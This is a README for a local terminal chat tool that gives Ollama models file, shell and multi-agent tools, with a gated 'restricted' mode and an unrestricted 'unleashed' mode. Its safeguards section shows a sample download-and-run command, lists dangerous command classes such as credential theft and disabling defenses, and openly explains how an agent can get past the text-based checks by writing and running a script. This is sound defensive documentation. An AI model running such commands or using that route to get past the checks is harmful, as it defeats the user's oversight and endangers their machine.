# ollama-workspace

A terminal chat for **any Ollama model you have installed**, with:

- **Any model, switchable** – pick from your installed models at startup and switch any time with `/model`. Each chat remembers its model, and the chat adapts to what each model supports.
- **Per-project chats** – each folder you launch from is its own project, with named chats and shared project notes, like Claude's projects. Memory never leaks between projects.
- **Lossless persistent memory** – the full transcript is always kept. Older parts are compressed into dated summaries, and the model can search the full transcript for exact details.
- **Code editing** – the model can list, search, outline, read, edit and create files in your project. Every edit shows a colored diff and waits for your approval.
- **File attachments** – drag a file into the terminal (or paste its path) to include its contents in your message.

## Setup

1. Install [Ollama](https://ollama.com/download) and pull at least one model, for example:
   ```
   ollama pull llama3.2
   ```
   Any chat model from the [Ollama library](https://ollama.com/library) works. For code editing, choose one that lists **tools** support (Qwen, Llama 3.1+, Mistral and others).
2. Install the Python package (Python 3.10+):
   ```
   pip install -e .
   ```
   This also installs an `ochat` command (so `ochat` works the same as `python chat.py`, from
   any folder on your PATH). `pip install -r requirements.txt` still works too, if you'd rather
   not install it as a package.
3. (Optional) It defaults to **restricted** [mode](#modes-restricted-and-unleashed) - fine for your own computer, no setup needed. Only set `OCHAT_MODE` if you want **unleashed** instead (a VM you can throw away), then open a new terminal:
   ```
   setx OCHAT_MODE unleashed
   ```
4. Run it from the project folder you want to work on:
   ```
   cd path/to/your/project
   python path/to/ollama-workspace/chat.py
   ```

On first run you pick a model from the ones you have installed. That choice is remembered. If only one model is installed, it's used automatically.

### Platforms

Works on **Windows, macOS and Linux** (tested on Windows 11 and Ubuntu) anywhere Python 3.10+ and Ollama run.

- **Linux:** if `pip install` complains about an "externally managed environment", use a virtual environment: `python3 -m venv .venv && . .venv/bin/activate`. On Ubuntu, that needs `sudo apt install python3-venv` first.
- **Ollama on another machine:** set `OLLAMA_HOST` (e.g. `OLLAMA_HOST=192.168.1.20:11434`) and the chat connects to that server. This is handy for a laptop using a desktop's GPU.
- **Your chats are stored locally** in `data/`, which isn't uploaded to git. To continue chats on another device, copy `data/` to that device's copy of the tool. Projects are keyed by folder path, so continue them from the same path, or use `--workspace`.

## Models

| Command | Does |
|---|---|
| `/models` | List installed models (`*` = current) |
| `/model` | Pick a model from a list |
| `/model <n or name>` | Switch by list number, full name, name without `:latest`, or a unique part of the name (e.g. `/model llama`) |
| `--model <name>` | Choose the model when launching (overrides the chat's saved model) |
| `/think [off\|low\|medium\|high]` | How much a thinking model reasons before answering. Less is faster. Saved per chat; default `low` (`THINK_LEVEL`). With no argument, shows the current level and what the model supports. |
| `--think <level>` | Set the thinking level when launching |
| `/reasoning [on\|off]` | Whether the model's reasoning is *printed* as it streams. Separate from `/think`: this never changes how much the model reasons, only what you see. Saved across restarts; default `on`. With no argument, shows the current state. |

**Which model is used:** a chat reopens with the model it last used. A new chat starts with the model you picked most recently. Models you install later show up in `/models` right away, without restarting.

**What adapts to each model:** the chat reads each model's capabilities from Ollama:

| Model supports | Effect |
|---|---|
| **tools** | File editing, history search and project notes are enabled. Without tool support, the model just chats, and it's told it can't see your files. |
| **thinking** | Its reasoning streams dimmed above the answer, unless `/reasoning off`. `/think` controls how much it reasons: models that report levels get the closest one (`high` uses the model's strongest, e.g. `xhigh`); others only switch thinking on or off. Models that always think can't be turned off. |
| **context length** | The context window is `NUM_CTX` (32k), or the model's own maximum if that's smaller. Memory, file reads and attachments are scaled to fit, so small-context models still work. Anything trimmed stays on disk. |

Embedding-only models are hidden, since they can't chat.

### Making it faster

Speed depends mostly on whether the model fits in your GPU's memory. Run `ollama ps` while chatting:

- **`100% GPU`:** fast.
- **A large CPU share (e.g. `79%/21% CPU/GPU`):** expect a few tokens per second.

At a few tokens per second, a model that writes 1,000+ tokens of thinking takes minutes before it acts.

1. **Use a model that fits your GPU.** As a rough guide, the model's size in `ollama list`, plus 1–4 GB for context, should be under your VRAM. For example, `qwen3:8b` fits an 8 GB card with `NUM_CTX = 16384`. Switch per chat with `/model`: a small model for quick work, a big one when quality matters.
2. **Think less.** `/think low` or `/think off` cuts the reasoning before each answer and tool call.
3. **Small extras:** set `OLLAMA_FLASH_ATTENTION=1` and `OLLAMA_KV_CACHE_TYPE=q8_0` for the Ollama server and restart it, and close other apps that use the GPU.

## Chats and projects

The folder you launch from is the **workspace**: the project the model works on and keeps memory for.

```
python chat.py                 continue the latest chat in this folder
python chat.py ideas           open the chat named "ideas", or start it
python chat.py --new           start a fresh, unnamed chat
python chat.py --resume        pick a chat from a list
python chat.py --workspace path/to/project    use another folder as the workspace
```

| Command | Does |
|---|---|
| `/new [name]` | Start a new chat in this project; if a chat already has that name, open it |
| `/chats` | List this project's chats (`*` = current) |
| `/resume <n or name>` | Switch chats by number from `/chats`, by name (case-insensitive), or by a unique part of the name |
| `/rename <name>` | Rename the current chat (unnamed chats are titled after their first message; names must be unique) |
| `/delete <n\|name>` | Permanently delete a chat (`/delete all`: every chat in this project). Doesn't go through the trash - chats live outside the workspace |
| `/agent [n\|name]` | Switch this chat to an agent profile (its own model, tool access, and persona). `/agent new <name>` creates one - you describe it in your own words, which drives how much it narrates vs. just shows code; `/agent delete <n\|name>` removes one; `/agent none` goes back to this chat's own model and full tools |
| `/notes` | Show the project notes and where to edit them |
| `/board` | Show the shared [agent board](#agents) and where to edit it |
| `/findings` | Show recorded [security findings](#scope-authorized-targets-for-security-testing) and where to edit them |
| `/scope [add\|remove\|clear] <target>` | Authorized targets for [security testing](#scope-authorized-targets-for-security-testing); empty by default (nothing checked) |
| `/mode` | Show this computer's mode and what it allows |
| `/unlock`, `/lock` | Let the model see and edit ochat's own code for this session (restricted mode asks your password), or stop it again. Chats and the password stay off limits |
| `/approve [on\|off]` | Ask before file changes (in unleashed mode, also commands), or stop asking. Lasts for this session |
| `/pace [seconds]` | Pause this long after each tool step, so you can actually follow an otherwise-unattended run as it happens. `0` or no argument: off / show the current value |
| `/cd [folder]` | Switch the workspace without restarting; opens that folder's latest chat |
| `!<command>` | Run a shell command yourself in the workspace, e.g. `!git status`. Its output isn't sent to the model |
| `"""` | Type a multi-line message by hand; end it with another `"""` line. Pasting needs nothing special: pasted text, line breaks included, never sends by itself, so you can keep typing after it; only an Enter you type sends. Up/Down recalls earlier messages |
| `/trash`, `/restore <n\|path>` | List deleted files, or put one back (see [Getting deleted files back](#getting-deleted-files-back)) |
| `/help` | List commands |
| `exit` | Quit (Ctrl+C at the prompt also works) |

### Interrupting to add information

Press **Ctrl+C** while the model is thinking or answering. The model stops right away and you're asked:

```
[paused] Add info for the model (Enter = just stop):
```

Type a correction or more context, e.g. `it's weekly, not daily`. The model continues **with its reasoning so far** plus your note, rather than starting over. Press Enter on an empty line to just stop. The history records interjections as `[interjected: ...]`, and a stopped reply that hadn't said anything yet isn't saved.

The model sizes each reply to the question, with a safety cap of 8192 tokens (`REPLY_LIMIT` in config.py). Unnamed chats that never got a message are discarded. Named ones are kept.

### Run it from any folder (`ochat`)

Add this folder to your PATH, then open a new terminal:

- **Windows:** `ochat.bat` is included. Add the folder under *Edit environment variables for your account → Path*.
- **macOS/Linux:** `chmod +x ochat`, then add the folder to `PATH` in your shell profile.

```
ochat                 continue the latest chat here
ochat ideas           open or start the "ideas" chat
ochat --model llama   ...with a specific model
```

### Shared install vs. copy inside a project

- **Shared install** – keep one copy anywhere and launch it from any project folder. Every project's memory is kept separately in this copy's `data/` folder.
- **Copy inside a project** – copy the folder into a project (leave out `data/`) and run `python ollama-workspace/chat.py` from the project root. The copy keeps its own `data/`, so the memory travels with the project. Inside a project, the model can't see or edit the tool's own folder, and the tool's `.gitignore` keeps `data/` out of your repo.

## Editing code

Ask in plain language, for example: `the login form doesn't validate emails, fix it`. When the model wants to change a file you'll see:

```
--- a/src/login.py
+++ b/src/login.py
-    return True
+    return EMAIL_RE.match(email) is not None
Apply to src/login.py? [y/N or type feedback]:
```

- `y` applies the edit.
- Enter or `n` rejects it.
- Anything else rejects it and sends your text back to the model as feedback, e.g. `use the existing validator in utils.py`.

The model works like a coding agent, with these tools:

| Tool | What it does | Asks first |
|---|---|---|
| `list_dir`, `list_files`, `find_files` | Browse folders, list a tree, find files or folders by name (`*.py`) | |
| `search_files`, `file_outline`, `read_file` | Search contents, map a large file, read it | |
| `edit_file`, `write_file` | Change part of a file, or create or overwrite one | yes |
| `make_dir`, `move_path`, `delete_path` | Create folders, move or rename, delete files or folders (to the trash) | yes |
| `list_deleted`, `restore_deleted` | See and bring back deleted files and folders | restoring |
| `run_command` | Run a shell command in the workspace (PowerShell on Windows): tests, scripts, git, installs | depends on the [mode](#modes-restricted-and-unleashed) |
| `dispatch_to_agent`, `list_agents` | Hand a task to another [agent](#agents) in this project and wait for its result | |

The model sees each command's output and exit code. A command is stopped after `COMMAND_TIMEOUT` seconds and can't prompt for input. "Asks first" for file changes can be turned off with `AUTO_APPROVE`.

### Agents

An agent profile (`/agent new <name>`) pins a chat to one model, one tool list, and a persona you write yourself - that persona is what actually sets the balance between narrating in text and just showing code; it's a prompting choice, not a fixed category, so "mostly text, call out code when it matters" and "coding only, a one-line status before each step" are both just descriptions you type.

Giving an agent the `dispatch_to_agent` tool lets it hand a task to another agent and wait for the result - a text-focused agent can delegate implementation to a coding one, and that agent can delegate further to another agent in turn, since dispatching is just a normal tool call like any other. A few things keep it predictable:

- **Sequential, not concurrent.** Dispatching blocks until that agent finishes; nothing runs in parallel. One agent working on your files at a time.
- **Each agent gets its own persistent chat** in the project (`agent:<name>` in `/chats`), separate from whoever dispatched to it, so its work and context build up across dispatches instead of starting over each time.
- **No loops.** An agent can't dispatch to itself, directly or through a longer chain (A → B → A is caught, not just A → A), and a chain can only go `MAX_DISPATCH_DEPTH` (3) agents deep before it's refused.
- Mode, approvals and the password gate apply exactly the same inside a dispatched agent's turn as anywhere else - delegating a task is never a way around them.

Giving an agent the `post_to_board` tool lets it leave a short, timestamped, attributed status update on the project's shared board (`/board`), which every agent and chat in the project sees automatically on its next turn - no dispatch needed. It's for frequent activity ("wrote add.py and verified it runs"), not lasting facts (that's still `save_note`/`notes.md`), and only the most recent posts that fit the context budget are shown; older ones stay on disk but drop out of what the model sees.

### Modes: restricted and unleashed

Defaults to **restricted** if the `OCHAT_MODE` environment variable is never set, so a new machine needs no setup to start safely. The tool only refuses to start if `OCHAT_MODE` is set to something that isn't a mode (a typo). The mode is shown at startup, and `/mode` shows it at any time. To use unleashed instead, run `setx OCHAT_MODE unleashed` and open a new terminal; it can't be changed from inside a chat.

**Unleashed** (for a VM): no restrictions. File tools accept any path on the computer, file changes and commands run without asking (`/approve on` to be asked), and the model gets up to `UNLEASHED_TOOL_STEPS` (200) tool steps per message instead of 50.

**Restricted** (for your own computer): you keep every feature and ordinary commands (`python app.py`, `pytest`, `git`, `pip install`, `npm`, …) run without asking. Dangerous commands show why they're risky and need your password:

```
$ iwr https://example.com/install.ps1 | iex
!! RESTRICTED: this command needs your password
  Why: downloads something from the internet and runs it right away, without you
       seeing what it is. This is the most common way malware gets in.
Password (Enter to cancel):
```

| Needs the password | Why |
|---|---|
| Download-and-run (`curl`/`iwr`/`wget`/… piped into a shell, or saved then executed) | Malware's most common way in. A plain download on its own isn't gated - that's normal dev work |
| Admin rights (`runas`, `-Verb RunAs`, `sudo`) | An admin can change anything on the computer |
| Auto-start - scheduled tasks/services, Startup folder/`$PROFILE`, `crontab`, `launchctl load`, `systemctl enable`, or writing into `.bashrc`/`.zshrc`/`.profile` - and registry changes | How malware survives a restart. Reading these (`crontab -l`, `cat ~/.bashrc`) isn't gated |
| Defender, firewall (incl. `ufw`, `iptables`, `pfctl`), boot, execution policy, backups, event logs, SIP (`csrutil`), Gatekeeper (`spctl`), SELinux (`setenforce`) | Disabling defenses is a typical first step of an attack |
| User accounts/groups (`net user`, `New-LocalUser`, `useradd`, `usermod`, `dscl`) or `sudoers`/`visudo` | Creating, promoting, or granting sudo to an account |
| Saved passwords and keys (`.ssh`, browser logins, `cmdkey`, `.aws`, the macOS Keychain, `/etc/shadow`, `.netrc`) | Credential theft |
| Hidden or inline code (`-EncodedCommand`, base64, `iex`, `python -c`, `cmd /c`, a nested `powershell`/`bash -c`) | You can't see what it really does, and it gets around these checks |
| `setx`, `OCHAT_MODE`, the tool's own code or `data/`, git hooks and `core.hooksPath` | Could switch these protections off |
| Changing or deleting files outside the workspace, formatting disks, shutting down | Damage beyond the project |
| A command mentioning a target outside this project's [scope](#scope-authorized-targets-for-security-testing), if one is defined | Catches a typo'd IP or a hallucinated host before it runs, not after. Refused outright (not password-askable) in unleashed mode |

Restricted mode also:
- **refuses to start as Administrator**, so commands never inherit admin rights;
- **hides the tool's own code** (`ollama_workspace/`, `chat.py`, the launchers) and the workspace's `.git/hooks` from the file tools, even when the workspace is the tool's folder. To have the model work on ochat itself, type `/unlock` (asks your password; lasts until `/lock` or restart) and review its changes with `git diff` before restarting, since that code includes these checks;
- **removes secrets** (variables with `TOKEN`, `SECRET`, `PASSWORD`, `API_KEY`, `AWS_*`, `GITHUB_*`, …) from the environment commands run with;
- tells the model which commands need the password, so it avoids them unless they're needed.

The password is set the first time a dangerous action actually needs it - not at startup, so a session that never hits one needs no setup. Only a salted hash is stored, in `data/password.json`. If you forget it, delete that file and you'll be asked for a new one.

**What restricted mode can't stop:** the checks read the command text, so they're a strong speed bump, not a wall. The main gap: the model can write a script with the file tools and run it as an ordinary command (`python script.py`), and the script can do anything a dangerous command could. With `AUTO_APPROVE` off you see every script before it's saved, so keep it off when working on code you don't trust, such as a freshly cloned repo, or use the VM. Approved commands run with your own user's permissions.

### Scope: authorized targets for security testing

For authorized pentesting/red-team work, a project can define its **scope** - the hosts, IP ranges, or domains you're actually allowed to touch. It's empty by default for every project, which means nothing is checked: this only ever adds friction to a project where you've deliberately defined one.

```
/scope add 10.0.0.0/24            a CIDR range
/scope add target.example.com     an exact host
/scope add *.lab.example.com      a wildcard domain
/scope                            list the current scope
/scope remove <n|target>          remove one
/scope clear                      remove all (asks first)
```

Once a scope exists, any `run_command` that mentions an IP or hostname outside it gets caught - but the consequence depends on the mode, since unleashed is built for runs nobody may be watching:

- **Restricted**: the same password prompt as any other dangerous action, with the specific target named so you can tell at a glance whether it's a typo, a hallucinated host, or a legitimate new target you just forgot to add.
- **Unleashed**: refused outright, no prompt - a prompt nobody's there to answer is the same as the agent just stopping, so this is a hard stop instead of a question.

Like the rest of the gate, this reads the command text (a best-effort check, not network-level enforcement). It's independent of `post_to_board`/`save_note`/`post_finding` - logging activity or a finding is never gated, no matter what's in scope; only *attempting* an action against an out-of-scope target is.

One check that **can't be approved around at all, in either mode**: a command that touches `data/` itself - the saved chats, password, scope, and agent profiles. The file tools already can never see `data/`; this closes the same gap for `run_command`, which otherwise has no path restriction of its own and could rewrite its own scope list via shell redirection, silently defeating the whole protection.

### Findings: recording results separately from the board

`post_finding(target, severity, description)` records a security finding - separate from `post_to_board`'s routine activity narration, so an engagement's actual deliverable doesn't get lost in "scanning host X now" chatter. Severity is one of `info`/`low`/`medium`/`high`/`critical`. Like the board, recent findings are shown automatically to every agent in the project (`/findings` to see them yourself), and older ones drop out of what the model sees once they no longer fit the context budget - they still live in `findings.txt` on disk.

### Monitoring and stopping an unleashed run

Unleashed is meant to run with little or no supervision, which cuts both ways: it's also easy for a long autonomous run to scroll past faster than you can actually read it. A few things help:

- **`/pace <seconds>`** pauses after each tool step, so you can watch it happen instead of catching up after the fact. `0` (the default) means no artificial delay, for runs you're not actively watching.
- **Ctrl+C actually stops it** - including anything a command started. `run_command` runs each command in its own process group and tears down the whole tree on interrupt (or on timeout), not just the one process it launched; a port scan or a listener it started doesn't outlive the command that launched it.
- The [board](#agents) and [findings](#findings-recording-results-separately-from-the-board) give you a readable trail of what happened even if you weren't watching live - check `/board` and `/findings` after the fact, or tail `board.txt`/`findings.txt` from another window while it runs.

### Getting deleted files back

`delete_path` doesn't erase anything: it moves the file or folder into the project's trash in `data/`. To get it back, ask the model (`bring back utils.py`) or do it yourself:

```
/trash              list deleted items, newest first
/restore 2          restore item 2 to where it was
/restore utils.py   restore by path (or part of one)
/trash empty        delete everything in the trash for good
```

If something already exists at the original path, nothing is overwritten: the model offers to restore under another name. Items are kept for `TRASH_DAYS` (30) days. Only `delete_path` uses the trash: files removed by a shell command, or overwritten by an edit, can't be restored this way.

The model can only touch files inside the workspace, and it can never read the tool's `data/` folder. To let it browse more, start it in a higher folder or use `--workspace`. Hidden folders (`.git`, `.venv`, …), `node_modules`, `__pycache__`, `venv`, `dist` and `build` are skipped when it lists or searches. Shell commands run with your own permissions, so they *can* reach outside the workspace (see the modes above). Use version control: deletes go to the trash, but other changes have no built-in undo.

### Large files

A model reads plain text as tokens, so file contents can't be compressed in a form it can still read. Instead, contents stay out of the context until the model needs them:

| Mechanism | What it does |
|---|---|
| `file_outline` tool | Returns only a file's classes, functions and headings, with line numbers. A 3,000-line file becomes a short map. |
| `read_file` line ranges | After the outline, the model reads only the lines it needs. |
| `edit_file` exact replacement | The model sends just the snippet to change, so edits work no matter how big the file is. |
| Read limit tied to context | One read or attachment can use up to `READ_SHARE` (40%) of the model's context window. |
| Automatic context trimming | If a long session would overflow the window, the oldest tool outputs are cleared first. Without this, Ollama silently drops the start of the conversation, which holds the memory and instructions. |

## Attaching files

Any existing file path in your message gets its contents attached:

```
> what does this do? "C:\Users\you\Documents\script.py"
[attached: script.py]
```

Paths may be quoted, unquoted, or written as `@path`. Paths with spaces need quotes (drag-and-drop adds them). The log records attachments by name only.

## Memory

Everything is stored in the tool's `data/` folder, which is git-ignored:

```
data/settings.json                    last model you picked
data/password.json                    restricted mode's password (salted hash only)
data/projects/<folder>-<hash>/
  project.json                        which folder this project belongs to
  notes.md                            project notes: every chat in the project sees them
  board.txt                           shared agent board: recent posts, every chat sees them
  scope.txt                           authorized targets for security testing - see Scope
  findings.txt                        security findings (post_finding) - see Findings
  agents/<name>.json                  agent profiles (model, tools, persona) - see Agents
  trash/<id>/                         deleted files and folders, restorable for TRASH_DAYS
  chats/<id>/log.txt                  full transcript: append-only, never shortened
  chats/<id>/chat.json                name, model, dates, and compressed summaries
```

A project is identified by its full folder path, so two folders that share a name stay separate.

**Each turn the model sees** the project notes, the shared agent board, recorded security findings, the dated summaries of older conversation, and the recent raw log of the current chat. All of it is trimmed to `MEMORY_SHARE` (50%) of the model's context window.

`notes.md` (`save_note`) is for sparse, lasting facts - decisions, conventions, preferences - and keeps everything ever saved. `board.txt` (`post_to_board`, `/board`) and `findings.txt` (`post_finding`, `/findings`) are both frequent, recent-activity feeds that only keep as many entries as fit the context budget - older ones drop off the front (they still live in the file on disk, just not in what the model sees) rather than getting summarized like the main log. They're kept separate on purpose: the board is routine narration, findings are the actual deliverable.

**How compression avoids losing memory:**

- **Summaries aren't rewritten.** Once the recent log passes `MAX_RECENT`, its oldest part becomes a new dated summary and older summaries are left as they are. (Rewriting one summary every time erodes old details a little more with each pass.)
- **Only the oldest summaries get merged.** When the summaries together pass `SUMMARY_BUDGET`, just the two oldest are merged, so recent history keeps the most detail.
- **The transcript is never cut.** `log.txt` keeps every word. The `search_history` tool searches it (or every chat in the project) and returns the exact original text.
- **Progress is saved as it goes.** Every exchange is saved immediately, and summaries are saved after each piece is compressed.

The current model does the compression, so it takes longer on large models running mostly on the CPU. To wipe one project's memory, delete its folder in `data/projects/`. Delete `data/` to wipe everything.

## Settings

All settings are in `ollama_workspace/config.py`:

| Setting | Default | Meaning |
|---|---|---|
| `NUM_CTX` | 32768 | Max context window in tokens (a model with a smaller max uses its own) |
| `THINK_LEVEL` | `low` | Thinking level for chats that haven't set one with `/think` |
| `THINK_BUDGET` | 8192 | Extra tokens for reasoning at `medium`; `low` gets half, `high` double |
| `MAX_RECENT` / `KEEP_RECENT` | 30k / 15k chars | When to compress older log, and how much raw log stays visible |
| `CHUNK` | 15k chars | Log covered by each summary |
| `SUMMARY_BUDGET` | 12k chars | Total summary size before the two oldest merge |
| `MEMORY_SHARE` | 0.5 | Max share of the context for memory |
| `READ_SHARE` | 0.4 | Max share of the context for one file read |
| `MAX_TOOL_STEPS` | 50 | Max tool calls per message (restricted mode) |
| `UNLEASHED_TOOL_STEPS` | 200 | Max tool calls per message (unleashed mode) |
| `AUTO_APPROVE` | False | Restricted mode: edit, create, move and delete files without asking (unleashed never asks) |
| `MAX_COMMAND_TIMEOUT` | 3600 | The longest timeout the model may give `run_command` |
| `COMMAND_TIMEOUT` | 300 | Seconds before a shell command is stopped |
| `TRASH_DAYS` | 30 | Days deleted files stay restorable |

**Context size and memory use:** a bigger `NUM_CTX` lets the model see more, but it takes more RAM or VRAM. For example, one 27B model measured 18 GB at 16k context, 22 GB at 64k, and 26 GB at 128k. To fit more context in the same memory, set these environment variables for the Ollama server and restart it:

```
OLLAMA_FLASH_ATTENTION=1
OLLAMA_KV_CACHE_TYPE=q8_0
```

## Programmatic use

For scripting or embedding ollama-workspace in something else, `ollama_workspace.api` runs a
single turn without the REPL:

```python
from ollama_workspace.api import run_once

reply = run_once("path/to/project", "list the files here", model="qwen3:8b")
print(reply)
```

It reuses the same memory, tools and mode rules (restricted/unleashed, scope, ...) as an
interactive session, so the project it's pointed at keeps accumulating the same persistent
memory either way. Pass `agent="name"` to run as one of that project's agent profiles instead
(its own model and persona apply) - that call reuses the agent's own persistent chat by
default, so repeated calls build up context like dispatching to it would. Pass
`ephemeral=True` instead for independent, non-accumulating calls (e.g. an evaluation harness
running many isolated prompts against the same agent): each call gets a fresh, throwaway chat
that's never reused, while the agent's model, persona and tool restrictions still apply. It
needs a running Ollama server, same as the REPL; see the docstring in
`ollama_workspace/api.py` for details, including what's different about calling it headless
(no approval prompts by default, since there's no one to answer them; reasoning isn't printed
by default either, regardless of the REPL's `/reasoning` setting - pass `show_thinking=True`
to print it for that call).

## Development

```
pip install -e ".[dev]"
pytest
ruff check .
```

The test suite runs without a network connection or an Ollama server - it covers the
security-critical pure functions (`guard.py`, `scope.py`, path resolution, the trash, memory
compaction) against temporary projects, never the real `data/` directory.

## Project layout

```
chat.py                  entry point
ochat.bat / ochat        launchers for Windows / macOS and Linux
pyproject.toml           packaging (pip install -e .), the ochat console entry point,
                         pytest/ruff config
tests/                   pytest suite (no network/Ollama needed; see Development)
.github/workflows/ci.yml ruff check + pytest on push/PR
ollama_workspace/
  chat.py                startup: parse args, pick the chat/model, the input loop
  api.py                 headless API: run one turn programmatically, without the REPL
  turn.py                run one message to completion: tool loop, interrupts, logging
  prompts.py             system prompts and the /help text
  stream.py              requests to the model: context trimming, streaming, Ctrl+C, thinking
  session.py             picking, opening and switching chats and models
  commands.py            /commands, /cd and !command
  agents.py              agent profiles: model + tools + persona presets, /agent
  scope.py               authorized targets for security testing, /scope
  tools/                 the tools the model can call
    base.py              shared: workspace limits, hidden paths, approvals
    browse.py            list_dir, list_files, find_files, search_files, file_outline, read_file
    edit.py              edit_file, write_file, make_dir, move_path
    deleting.py          delete_path, list_deleted, restore_deleted
    shell.py             run_command
    history.py           search_history, save_note, post_to_board
    dispatch.py          dispatch_to_agent, list_agents
    pentest.py           post_finding
  guard.py               restricted / unleashed modes, dangerous-command and scope checks, password
  trash.py               deleted files: move to trash, list, restore
  memory.py              projects, chats, log and compression
  models.py              installed models, capabilities, model switching
  config.py              settings and paths
  attachments.py         file attachments in messages
  console.py             reading input (multi-line paste, history)
data/                    your chats, notes and settings (created on first run, git-ignored)
```

## License

[MIT](LICENSE) - free to use, modify and share, including commercially, as long as the copyright notice is kept. The software comes with no warranty.
